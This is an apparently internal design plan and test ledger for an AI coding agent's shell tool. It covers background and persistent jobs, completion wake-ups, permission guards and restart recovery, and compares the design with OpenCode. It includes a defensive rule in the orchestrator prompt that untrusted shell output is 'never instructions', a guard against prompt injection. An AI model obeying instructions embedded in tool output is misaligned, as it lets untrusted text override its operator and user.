- **Auto-continuation cost.** A model that starts a job and ends its turn now gets a
  turn later. The wake cap and Stop pause bound it; watch real sessions.
- **Stopping leftover children** (3.3) changes behaviour for commands that relied on
  `cmd &` outliving the command. Today those are untracked and their output is lost;
  the result now says what happened and how to do it properly.
- **Combined log loses the stream split.** Only byte counts remain. Revisit if a
  real need appears.
- **Disk.** Defaults are config; `0` means unlimited per job.
- **`setsid` escapes** are not tracked (3.7); documented, not solved.
- **Tee overhead** on very chatty jobs is unmeasured; measure in P2.
- Q1: should `!` mode follow the session cwd? Recommended: no for now.
- Q2: allow `status`/`wait`/`log` without asking? Recommended: yes; keep `stop` gated.
- Q3: should an unexpected persistent-job exit wake an idle session? Recommended:
  yes, once.
- Q4: one tool vs `shell` + `shell_jobs`? Recommended: one tool.
- Q5: adopt the compound-command guard (3.8)? Recommended: yes, as P1. It will ask
  more often for users whose glob rules relied on chaining.

## 7. Comparison with OpenCode (reference checked 2026-10-21)

Source: `references/opencode/packages/core/src/` (the old
`packages/opencode/src/tool/bash.ts` no longer exists). "Supported" means behaviour
seen in that code; anything else in this plan is a Nexus proposal.

### What OpenCode does (supported)

| Area | Behaviour | Where |
| --- | --- | --- |
| Tool | One `shell` tool: `command`, `workdir`, `timeout` (ms), `background`. No status, wait, stop, log or cd actions | `tool/plugin/shell.ts:23`, `:48-61` |
| Timeouts | Foreground default 2 min and killed on timeout; background has no timeout unless given | `tool/plugin/shell.ts:24`, `:201`; `Shell.timeout` `shell.ts:191-196` |
| No separate service concept | Dev servers and long builds both use `background: true` | `tool/plugin/shell.ts:57-60` |
| Output capture | Combined stdout/stderr streamed to one file per command, newlines counted while streaming; no size cap seen in the write path | `shell.ts:54-60`, `:323-334` |
| Shown output | Tail only, last 50 KiB / 2,000 lines, with `[showing lines X-Y of N; full output saved to <file>]` | `Shell.result` `shell.ts:228-252`; limits `tool-output.ts:13-14` |
| Reading more | Cursor + limit reads of the file (`Shell.output`, default 64 KiB); the model gets the path | `shell.ts:198-226`, `tool/plugin/shell.ts:96-101` |
| Retention | Files under `<data>/shell/<project>/`, deleted by mtime after 7 days, swept hourly; 25 exited commands kept in memory | `shell.ts:30-34`, `:83-117`, `file-retention.ts:6-23` |
| Process | `stdin: "ignore"`, `detached` group, force kill 3 s after the signal; cwd re-validated right before spawn | `shell.ts:301-307`, `tool/plugin/shell.ts:146-153` |
| Notification | On completion a "synthetic" session input `<shell id state command>…</shell>` with the output; admitted by id (conflict error on reuse) and wakes the session unless `resume: false` | `tool/plugin/shell.ts:157-189`, `shell/result.ts:45-63`, `session/session.ts:273-313` |
| Durable marker | A notification id is allocated when work is backgrounded and persisted in KV until the notification is admitted | `job.ts:198-208`, `:357-369`, `:452-463` |
| Restart | Pending background shells are reported as "Command cancelled because the server restarted" with `resume: false` (no wake) | `session/execution/restart.ts:101-136` |
| User backgrounding | `Session.background` moves a session's blocking jobs to the background and adds a "do not poll" instruction | `session.ts:442-459`, `job.ts:387-409` |
| Prompting | Background result says: you will be notified, do not poll, keep working or end your response | `tool/plugin/shell.ts:26-27` |
| Permissions | Command parsed (tree-sitter, portable fallback) into sub-commands; each is a permission resource; "always" saves an arity prefix such as `npm run dev *`; `cd` targets become directory accesses that need external-directory approval | `shell/parse.ts:14-21`, `:23-161`, `:185-203`; `tool/plugin/shell.ts:123-145` |
| Environment | Sets `AGENT=1`, `OPENCODE=1`, `AI_AGENT`, session id | `tool/plugin/shell.ts:213-216` |

Not found in the inspected files: a persistent cwd, readiness detection, a
lifetime-free service kind with limits, a wake cap or a pause after the user stops,
orphan process cleanup after a crash, or log size bounds. Their absence is noted from
these files only, not a claim about the whole repository.

### Adopted or adapted

- **Background without a lifetime limit replaces a `service` action** (adapted). Kept
  Nexus's limits, duplicate hint and orphan policy on top.
- **One combined log per job in arrival order**, newline counting while streaming,
  "lines X-Y of N" notices (adapted; Nexus keeps head + tail rather than tail only).
- **Time-based retention, 7 days** (adopted), plus Nexus size bounds.
- **"Do not poll; keep working or end your response" wording** (adapted).
- **User "move to background"** from the TUI (adapted to one job, host-mediated).
- **Restart notices do not wake** (same choice; already in the draft).
- **Durable delivery before it is needed**: OpenCode persists the marker at
  background time; Nexus writes the exit event and the queue admission in one batch
  (adapted to the existing log).

### Rejected

- **No `wait`/`stop`/`log` actions.** Nexus keeps them: `wait` is the honest "I need
  this now", `stop` is needed for persistent jobs, and `log` avoids a permission
  prompt for reading machine-state paths.
- **Tail-only shown output.** Nexus keeps head + tail; the head often holds the
  real error (bad flag, missing file).
- **Unbounded log files.** Nexus states and enforces bounds.
- **Tree-sitter parsing and an arity table** for permissions. A WASM grammar
  dependency and a 140-entry table are heavy; the smaller guard in 3.8 closes the
  concrete hole. Arity-prefix "always" grants would also widen Nexus's exact grants.
- **Treating `cd` targets in a command as directory approvals.** Nexus is not a
  sandbox (non-goals); doing this halfway would suggest containment it does not give.
- **Foreground default timeout of 2 min with kill.** Nexus's yield-then-notify keeps
  long foreground work alive without the model guessing a timeout.
- **Agent environment markers** are a reasonable idea but outside this plan.

### Dropped from the first draft as over-engineering

The `service` action and unique `name`; per-stream log files; `meta.json` and
tombstones; rolling service segments; the free-disk pre-check; the 1 s delivery
debounce; the TCP readiness probe; the durable `shell.job_ready` event; copying and
worktree-remapping the parent cwd into children; the `notify` flag.

## 8. Verification ledger

- 2026-10-21: plan written from code inspection only. No code changed, no tests run.
  Items marked *inference* in section 2 still need a test to confirm.
- 2026-10-21: orchestrator ran `.venv/bin/python -m pytest -q tests/test_docs.py` and
  all 36 passed (documentation validation only).
- 2026-10-21: revised after reading OpenCode's `core/src/shell.ts`, `job.ts`,
  `tool/plugin/shell.ts`, `shell/result.ts`, `shell/parse.ts`, `tool-output.ts`,
  `file-retention.ts`, `session/session.ts`, `session.ts` and
  `session/execution/restart.ts`, and re-reading Nexus `_jobs.py`, `bash.py`,
  `_output_limit.py`, `permissions.py`, `session.py`, `host/facade.py` and
  `session/db.py`. Gaps 2, 6 and 12 are new and come from reading code, not tests.
  No code changed.
- 2026-10-21: P0–P3 implementation completed in workspace. Targeted tests pass 98/98:
  `.venv/bin/python -m pytest -q tests/test_builtin_shell_rename.py tests/test_shell_compound_guard.py tests/test_shell_logs.py tests/test_shell_cwd.py`
  (including fix in `_jobs.py:_cleanup_child_process_group` to terminate leftover process groups).
- 2026-10-21: broader checks passed 335/335:
  `.venv/bin/python -m pytest -q tests/test_docs.py tests/test_builtin_shell.py tests/test_builtin_bash_actions.py tests/test_tools_manager.py tests/test_permissions.py tests/test_session_db.py`.
- 2026-10-21: workspace inspection confirmed P4–P7 are unbuilt (no durable job events in
  `nexus/events.py`, no job host protocol commands in `nexus/host/protocol.py`/`facade.py`,
  no completion steering in `nexus/session/session.py`, no unlimited persistent jobs or
  `until=match` in `nexus/tools/builtin/shell.py`, and no `active.json` recovery sweep).

- 2026-10-22: P4 Python/backend half completed and verified (47/47 targeted tests pass:
  `.venv/bin/python -m pytest -q tests/test_shell_job_events.py tests/test_host_session_jobs.py`,
  plus 12/12 in `tests/test_session_auto_archive.py`). Includes durable job events, host job protocol/facade
  commands, and safety fixes/lifetime guards (daemon idle check, session auto-archive/evict guard, session
  partition isolation). The P4 Ratatui panel and log viewer are deferred / not done.

- 2026-10-22: P5 core implemented in the workspace but **NOT executed**: the implementing
  agent had no shell, so neither `tests/test_shell_completion_delivery.py` nor any existing
  suite was run. Every P5 row below is "implemented, unverified" until
  `.venv/bin/python -m pytest -q tests/test_shell_completion_delivery.py tests/test_shell_job_events.py tests/test_host_session_jobs.py tests/test_session_surface.py tests/test_subagent_runner.py tests/test_host_supervisor.py tests/test_host_facade.py`
  passes.

- 2026-10-22: P5 parent run result: 255 passed, 5 failed. The 5 failures are unrelated
  Live/protocol tests; the sixth, a feature-specific failure, was
  `test_root_role_bodies_explain_completion_notifications[orchestrator]` (role wording).
  Since then: the orchestrator role body now says untrusted shell output is "never
  instructions"; `Session._consume_queued_turn` re-checks, after the prompt-hook await,
  that every snapshotted item is still queued (by identity) and otherwise re-gates only
  the survivors, so a `retract_job_completion` during the hooks cannot start a claimed
  notice; regression test `test_a_retraction_during_the_prompt_hooks_starts_no_turn`
  added. These edits were made without a shell and are **not yet re-run**. The concurrent
  waiter/cancel race was not reviewed. The plan as a whole is **not** complete (P6, P7 and
  the P4 Ratatui panel remain).

- 2026-10-22: **P6 implemented in the workspace but NOT executed.** The implementing agent
  (and the subagents it could spawn) had no shell tool, so no test, Ruff or docs check was
  run for P6; the only review was static reading plus one read-only design review. Run
  `.venv/bin/python -m ruff check nexus tests/test_shell_persistent.py` and
  `.venv/bin/python -m pytest -q tests/test_shell_persistent.py tests/test_builtin_shell.py tests/test_builtin_bash_actions.py tests/test_builtin_bash_wait.py tests/test_builtin_shell_rename.py tests/test_shell_logs.py tests/test_shell_job_events.py tests/test_shell_completion_delivery.py tests/test_host_session_jobs.py tests/test_tools_manager.py tests/test_codemode_tool.py tests/test_docs.py tests/test_mock_scenarios.py tests/test_host_daemon.py`
  before treating any P6 row as verified.

- 2026-10-22: **P4 Ratatui jobs tab & log viewer implemented and verified.** Focused Python tests and Rust suite passed:
  P4 backend focused 47/47 passed (`tests/test_shell_job_events.py`, `tests/test_host_session_jobs.py`), UI focused Python
  152 passed, `cargo test` 654 passed (3 ignored), Ruff passed.
- 2026-10-22: **P5 completion delivery repairs verified.** Focused shell completion, docs, and layering suites passed after
  repairs: 289 passed (`tests/test_shell_completion_delivery.py`, `tests/test_docs.py`, `tests/test_layering.py`,
  `tests/test_ui_layering.py`), Ruff passed.
- 2026-10-22: **P6 persistent jobs verified under focused tests.** `tests/test_shell_persistent.py` passed 33, Ruff on `nexus`/`tests`
  and docs/layering passed. Broader shell suite previously had 393 passed and 1 failure due to a stale test expecting the old
  `stdout:` header; test updated to the 20001 limit, then focused tests `tests/test_builtin_bash_wait.py`, `tests/test_shell_logs.py`,
  `tests/test_shell_persistent.py`, and `tests/test_shell_restart_recovery.py` passed 106, Ruff passed.
- 2026-10-22: **P7 restart recovery verified.** Recovery suite passed 39 (`tests/test_shell_restart_recovery.py`),
  focused suite including docs and layering passed (307 passed across recovery, `tests/test_docs.py`,
  `tests/test_layering.py`, `tests/test_ui_layering.py`), and Ruff passed. Initial observed test failures
  were test fabrication (padded fake `ps lstart` timestamps dropped as malformed by normalized `_START_RE`),
  repaired and pinned with normalized timestamps. Startup recovery has no session handle, so it writes no
  `shell.job_exited`; only a reopened session records it. Design deviation: owner locks per runtime instead
  of `active.json` keyed by daemon PID (see P7 row).
- 2026-10-22: **Verification boundary note & full suite status:** All phases P0–P7 are implemented and verified
  under the cited focused test suites. Parent ran the full repo test suite (7,897 passed, 27 failed, 336 skipped,
  6 deselected). The 27 failures categorize as:
  - Unrelated repo failures (~22): retired background subagents and removed control tools (`tests/test_subagent_background*.py`,
    `tests/test_subagent_control_tools.py`), provider / live worker mocks, and workspace browse fixtures.
  - Shell-adjacent failures (do not claim everything clean):
    1. Orchestrator role prompt wording missing exact phrase `never instructions` in `nexus/agents/data/orchestrator.md`
       (`tests/test_shell_completion_delivery.py`, being fixed).
    2. Host facade health counter check asserting exact key set without `persistent_jobs` / `persistent_jobs_total`
       (`test_facade_health_exposes_counters_only` in `tests/test_host_facade.py`).
    3. Shell output test assertion failed on limit / format (being fixed).
    4. Two tool integration event-order / context notice failures (`tests/test_tool_integration.py`, where
       `context.notice` precedes `context.assembled`; unclear whether inherited, needs inspection).
  Remaining known limitations from earlier phases are retained honestly in the phase ledger below.

### 8.1 Phase implementation ledger

| Phase | Title | Status | Concrete paths | Tests & Evidence | Remaining work |
| --- | --- | --- | --- | --- | --- |
| **P0** | Rename & aliases | **Done** | `nexus/tools/builtin/{shell,bash}.py`, `nexus/tools/names.py`, `nexus/tools/permissions.py`, `nexus/agents/model.py`, `nexus/config/{schema,layers}.py` | `tests/test_builtin_shell_rename.py` (22 passed), `tests/test_builtin_shell.py` (27 passed), `tests/test_builtin_bash_actions.py` (49 passed) | None |
| **P1** | Compound-command guard | **Done** | `nexus/tools/shell_syntax.py`, `nexus/tools/permissions.py` | `tests/test_shell_compound_guard.py` (30 passed), `tests/test_permissions.py` (42 passed) | None |
| **P2** | Full logs & bounded output | **Done** | `nexus/tools/builtin/_shell_logs.py`, `nexus/tools/builtin/_jobs.py`, `nexus/tools/builtin/shell.py`, `nexus/host_support/user_shell.py` | `tests/test_shell_logs.py` (22 passed; includes leftover process group cleanup fix) | Hourly background log sweep cron (retention runs at job spawn) |
| **P3** | Session working directory | **Done** | `nexus/tools/builtin/shell.py`, `nexus/tools/builtin/_shell_logs.py` (`.session_cwd`) | `tests/test_shell_cwd.py` (24 passed) | Event-sourced `shell.cwd_changed` event in session DB (currently private file per deviation) |
| **P4** | Durable jobs & TUI | **Done (verified: backend 47/47, UI 152, cargo 654/3, Ruff passed)** | `nexus/events.py`, `nexus/tools/builtin/{_jobs,shell}.py`, `nexus/view/{model,reduce}.py`, `nexus/session/manager.py`, `nexus/runtime.py`, `nexus/host/{protocol,facade,daemon}.py`, `nexus/host_support/{session_jobs,user_shell}.py`, `nexus/client/protocol.py`, `nexus/ui_support/tool_details.py`, `nexus/ui/ratatui/{jobs,sidebar}.py`, `rust/tui/` | `tests/test_shell_job_events.py` (20 passed), `tests/test_host_session_jobs.py` (27 passed), `tests/test_session_auto_archive.py` (12 passed); UI focused Python 152 passed; `cargo test` 654 passed (3 ignored); Ruff passed | **Done:** `shell.job_started/yielded/exited` via a `JobRegistry` event sink (started after spawn, exit once from finalization, yield once and never after exit), `ConversationView.jobs`, four host commands, safety lifetime guards: `Runtime.has_active_shell_jobs` daemon idle guard, `SessionManager(busy_check=…)` evict/archive guard, partition isolation, `SessionJobBackground` interrupting the awaiting foreground call; Ratatui jobs panel, log viewer, and snapshot rendering implemented. **Remaining / limitations:** Job events for sub-agent sessions (handles not in the main manager); a replay shows a job "running" after a daemon crash until P7 recovery; `SessionDelete` of a session with running jobs neither refuses nor stops them (pre-existing; the retired handle drops their remaining events) |
| **P5** | Completion delivery | **Done (verified: 289 passed across delivery, docs, layering; Ruff passed)** | `nexus/tools/builtin/{_jobs,bash_output,kill_shell}.py` (claim, bounded untrusted text, sinks), `nexus/session/{session,manager}.py` (`record_job_completion`, automated origin, wake pause/cap, atomic batch), `nexus/runtime.py` (sinks, notifier seam, `_stop_child_jobs`), `nexus/host/facade.py` (notifier, Stop pause), `nexus/agents/runner.py` (child end), `nexus/host_support/session_jobs.py` (quiet user stop), `nexus/config/{schema,layers}.py` (`shell_max_auto_wakes`), `nexus/tools/codemode/tool.py`, `nexus/agents/data/{build,orchestrator}.md` | Focused suites passed after repairs: 289 passed across `tests/test_shell_completion_delivery.py`, `tests/test_docs.py`, `tests/test_layering.py`, `tests/test_ui_layering.py`; `tests/test_codemode_tool.py` background refusal; Ruff passed | **Done:** exit + `input.queued` in one `append_batch` keyed `shell-job-<id>` (repeat = same queued id); steer for active turn / one turn when idle / burst consumed together; `wait` claim, cancelled-`wait` release, `status`/`wait`/`stop` retraction; Stop pause (`context.notice shell_wake_paused`) with next typed turn consuming notifications first; `shell_max_auto_wakes` cap; child/manager sessions take none and child-end jobs are stopped and listed; output ≤ 80 lines / 8 KiB, every line `| `-quoted under an untrusted header (job id, status, duration only; no command or cwd); code-mode `background` refusal (`tools/codemode/tool.py`); `agents/data/{build,orchestrator}.md` wording. **Remaining / limitations:** Stop pause is in-memory only (lost on daemon restart); `exit event delivery` is `queued` even if wake never starts a turn (cap/Stop only changes to `paused`); release of cancelled `wait` re-admits without second exit event; concurrent waiter/cancel race unreviewed |
| **P6** | Persistent jobs | **Done (verified: 33 persistent, 106 focused wait/logs/persistent/recovery, Ruff passed)** | `nexus/tools/builtin/{shell,_jobs,bash_output,bash}.py`, `nexus/tools/{manager,names,spec}.py`, `nexus/host/{daemon,facade,protocol}.py`, `nexus/runtime.py`, `nexus/host_support/session_jobs.py`, `nexus/config/{schema,layers}.py`, `nexus/view/{model,reduce}.py`, `nexus/ui/ratatui/jobs.py`, `nexus/cli.py`, `nexus/devtools/mock/scenarios/shell_persistent.py`, `docs/{tools,config,host,security,module-map,devtools}.md`, `README.md` | `tests/test_shell_persistent.py` (33 passed); Ruff on `nexus`/`tests` and docs/layering passed; broader suite had 393 passed, 1 failure due to stale test expecting old `stdout:` header; test updated to 20001, then focused `tests/test_builtin_bash_wait.py` + `tests/test_shell_logs.py` + `tests/test_shell_persistent.py` + `tests/test_shell_restart_recovery.py` passed 106, Ruff passed | **Done:** Persistent kind = `background` without `timeout_s` (legacy `run_in_background` stays capped via an out-of-band `ToolContext.legacy_capped_background` flag; subagents refused; code mode already refused), 4/8 limits (`tools.shell_max_persistent_per_session`, `tools.shell_max_persistent`) checked atomically in `JobRegistry.spawn` with a same-session-only list, duplicate command+cwd = error naming the running `job_id`, `wait until=match pattern` (incremental, ANSI-stripped, partial-line aware, ≤ 120 s, timeout leaves the job running, thread + `grep_timeout_s` deadline, nested-quantifier patterns refused), `wait until=exit` ≤ 600 s for persistent jobs, per-action manager deadline (`ToolManager._timeout_for(spec, args)`), persistent group not stopped when the shell leader exits (0.25 s group poll, `stop`/shutdown signal the group, no signal after the group is seen empty), unexpected exit delivered once through P5 path, daemon orphan policy (`tools.shell_orphan_s`, monotonic, jobs stopped before exit with `stopped` reason on `shell.job_exited` and a `daemon.orphan_jobs_stopped` log), `nexus daemon status` lists jobs (Health `persistent_jobs[_total]`), `nexus daemon stop` ends groups via runtime shutdown, `persistent` on `shell.job_started`/`JobView`/`JobSummary`/Ratatui row mode, `/mock shell-persistent`. **Remaining / limitations:** `label` parameter not implemented; unexpected-exit wake covered at registry sink level, not end-to-end through session; regex worker cannot be killed so pathological pattern outside refused shapes can keep a thread busy; a group of only unreaped zombies would look alive |
| **P7** | Restart recovery | **Done (verified: 39 recovery, 307 focused recovery+docs+layering, Ruff passed)** | `nexus/tools/builtin/_job_recovery.py`, `nexus/tools/builtin/_jobs.py` (owner record, tracking, `job_may_be_live`, `recover_orphans`), `nexus/runtime.py` (state dir, probe, `recover_shell_orphans`), `nexus/host/daemon.py` (startup sweep), `nexus/session/{session,manager}.py` (`job_probe`, recovery event), docs `docs/{tools,security,host,module-map,events-and-view}.md` | `tests/test_shell_restart_recovery.py` (39 passed); `tests/test_docs.py`, `tests/test_layering.py`, `tests/test_ui_layering.py` (307 passed); Ruff passed | **Done:** Per-registry owner `flock` + atomic JSON record under `<home>/projects/<key>/shell-owners/` (`0700`/`0600`, `O_NOFOLLOW`, size-capped, fields validated; deviation: owner locks per runtime instead of `active.json` keyed by PID); group identity = `(pid, ps lstart, pgid, uid)` of up to 8 members refreshed every 5 s and at leader exit; daemon-start sweep (worker thread, 6 s budget) signals only after fresh listing re-verifies member before SIGTERM/SIGKILL, never on bare PID or group existence, never another user's or its own group; reopened session writes exactly one `shell.job_exited` (`interrupted`, `delivery: none`, `recovered`) per lost job under session lock with no queue admission and no turn, fail closed when no probe/state dir; graceful `aclose` deletes both files. **Remaining / limitations:** A real `Daemon` *subprocess* `kill -9` test (current tests kill a registry-owning subprocess and run in-process daemon over leftovers); non-waking `context.notice` for recovered jobs (exit event alone written); recovery events for sub-agent sessions and `!` runs; processes not recorded yet at kill (ms after fork, ≤ 5 s for new member); platforms without `ps -o lstart`; sweep leaves unsettled groups for next start when 6 s budget runs out |

